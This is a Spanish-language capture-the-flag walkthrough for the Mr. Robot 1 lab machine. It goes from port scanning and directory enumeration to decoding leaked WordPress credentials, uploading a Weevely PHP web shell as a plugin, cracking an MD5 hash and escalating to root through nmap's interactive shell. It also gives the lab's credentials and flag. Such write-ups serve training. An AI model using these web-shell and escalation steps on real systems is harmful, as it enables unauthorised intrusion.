<p align="center">
  <a href="https://github.com/DenverCoder1/readme-typing-svg"><img src="https://readme-typing-svg.herokuapp.com?size=50&color=3CF700FF&width=400&height=70&lines=Mr.Robot_1"></a>
</p>
  
<h1 align="center"></h1>

**[Descargar máquina]:**

Vulnhub: https://www.vulnhub.com/entry/mr-robot-1,151/

**[Online]:**

Root-Me: https://www.root-me.org/fr/Capture-The-Flag/CTF-all-the-day/test?lang=es

<h1 align="center"></h1>

</br>

- *Paso 1:* Escanear todos los puertos que estén abiertos con Nmap. 
```
nmap -p- --open -sC -n -Pn -vvv ctf14.root-me.org
```
![1](https://user-images.githubusercontent.com/75953873/173256530-9e554740-e9d2-450e-8e1a-209d773c7247.png)

Puertos abiertos: [22,80,443]

- *Paso 2:* Enumerar directorios web con Dirb. 
```
dirb http://ctf14.root-me.org /usr/share/dirb/wordlists/small.txt
```
![2](https://user-images.githubusercontent.com/75953873/173256804-380ff8a7-8b69-4153-8ee8-8c1eb7c8eb0d.png)

URL objetivo: http://ctf14.root-me.org/license

![3](https://user-images.githubusercontent.com/75953873/173256860-82d25cc3-6a8c-4e59-97a8-cbe263df5162.png)

Credenciales ofuscadas a base64: **ZWxsaW90OkVSMjgtMDY1Mgo=**

- *Paso 3:* Decodificar credenciales con Python y Bash.

`Python:`
```python
import base64
key = 'ZWxsaW90OkVSMjgtMDY1Mgo='
print(base64.b64decode(key))
```

`Bash:`
```
echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d
```
![4](https://user-images.githubusercontent.com/75953873/173257252-c7dac9d3-f612-44ff-b31b-9d9baf5d297e.png)

Usuario: `elliot`

Contraseña: `ER28-0652`

- *Paso 4:* Acceder al panel de administración de WordPress, generalmente se agrega `/wp-admin.php` o `/wp-login.php` al final del dominio.
```
http://ctf14.root-me.org/wp-login.php
```
![5](https://user-images.githubusercontent.com/75953873/173257567-b73aa894-5756-41d1-b73b-f31db5de3f3d.png)

Plugins **>** instalar plugins

![6](https://user-images.githubusercontent.com/75953873/173257615-a9b95d88-ca5a-4a92-95a3-3391c4bd38a3.png)

Agregar nuevo plugin **>** Subir plugin

![7](https://user-images.githubusercontent.com/75953873/173257639-ce85dec7-fc54-4830-88b4-f040fa379b14.png)

- *Paso 5:* Crear backdoor con Weevely.
```
weevely generate pass123 backdoor.php
```
![8](https://user-images.githubusercontent.com/75953873/173257694-583bc09c-8970-45bf-abd2-cd033643ef74.png)

- *Paso 6:* Subir backdoor como un plugin más.

![9](https://user-images.githubusercontent.com/75953873/173257782-8da08f9d-c687-458c-a84e-bb0cfd0ae0d0.png)

En el apartado de `Media` tenemos archivos e imágenes, el que nos interesa es el `backdoor.php` que acabamos de subir. Doble clic sobre él y copiamos la URL que esta en `Description`.

![10](https://user-images.githubusercontent.com/75953873/173257806-03d06d7d-9f12-4d0a-896a-daa654620609.png)

![11](https://user-images.githubusercontent.com/75953873/173257849-3f3aa920-9d27-4dd6-88fa-e26396948493.png)

URL: http://ctf14.root-me.org/wp-content/uploads/2022/06/backdoor.php

- *Paso 7:* Acceder al backdoor con Weevely.
```
weevely http://ctf14.root-me.org/wp-content/uploads/2022/06/backdoor.php pass123
```
![12](https://user-images.githubusercontent.com/75953873/173257930-15d0189a-e1bd-4a23-84df-7b79357ae5f5.png)

Entramos al direcorio `/home` **>** robot **>** `cat` para mostrar el contenido del archivo `password.raw-md5`.

![13](https://user-images.githubusercontent.com/75953873/173258021-b8bb555d-5578-4f35-a6ed-89c0c0a08a17.png)

Hash: `c3fcd3d76192e4007dfb496cca67e13b`

- *Paso 8:* Identificación de tipo de hash con Hash-Identifier.
```
hash-identifier
```
![14](https://user-images.githubusercontent.com/75953873/173258174-b4dc146e-bba1-4433-b52f-343b83020f9d.png)

Tipo de hash: **MD5**

- *Paso 9:* Desencriptar hash con JohnTheRipper y de forma online.

`JohnTheRipper:`
```
john --format=Raw-MD5 --wordlist=/home/whoami/crackMD5.txt hash.txt
```
![16](https://user-images.githubusercontent.com/75953873/173258469-18fcf953-77ba-4c07-b2e9-692086788ec8.png)

`Online:`
- https://hashtoolkit.com/decrypt-md5-hash/

![15](https://user-images.githubusercontent.com/75953873/173258477-324ff102-6b01-4c81-807b-6148b9fccbdd.png)

Clave desencriptada: 	`abcdefghijklmnopqrstuvwxyz`

- *Paso 10:* Acceder al servidor SSH remotamente, la contraseña es el hash descifrado.
```
ssh robot@ctf14.root-me.org 
```
![16](https://user-images.githubusercontent.com/75953873/173258600-90109f0c-79be-4b1d-b7a4-81e1f00e221f.png)

Entramos al direcorio `/usr/local/bin` e interactuamos con nmap.
```
cd /usr/local/bin
nmap --interactive
```
![18](https://user-images.githubusercontent.com/75953873/173258664-e6ba0c73-db36-4979-8844-351e89df0eeb.png)

Por último, escalamos privilegios con nmap y extraemos la llave (flag) del fichero `passwd`.
```
!sh
cat /passwd
```
![19](https://user-images.githubusercontent.com/75953873/173258754-b48703a8-ceef-46df-bd32-1979ec294639.png)

**KEY:** 9e5ddd93d307150a16a03d56ff319c6d

![8](https://user-images.githubusercontent.com/75953873/172520842-29a1669f-f89d-44b4-a818-297d7b1b472f.png)
